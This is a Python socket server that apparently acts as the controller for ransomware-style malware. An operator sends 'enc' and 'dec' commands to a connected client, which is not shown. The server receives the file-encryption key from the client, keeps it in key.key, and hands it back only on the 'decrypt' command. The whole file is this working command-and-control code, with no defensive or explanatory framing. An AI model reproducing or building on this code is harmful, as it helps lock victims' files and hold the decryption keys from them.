import socket

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 65432  # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    while True:
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"Connected by {addr}")

            while True:
                x = input("> ")
                conn.sendall(x.encode())
                if x == "enc":
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            continue
                        with open("key.key", "wb") as key:
                            key.write(data)
                            break
                elif x == "dec":
                    with open("key.key", "rb") as key:
                        conn.sendall(key.read())
                elif x == "help":
                    print("""
Commands  |  Descriptions
________  |  ______________                
  enc     |  Encrypts files.
  dec     |  Decrypts files.
  close   |  Closes the client.
  exit    |  It shuts down both the client and the server.
  help    |  Shows commands and explanations.
                     
                    """)
                elif x == "close": break
                elif x == "exit": break
                else: print("Invalid command.")
            if x == "exit":break


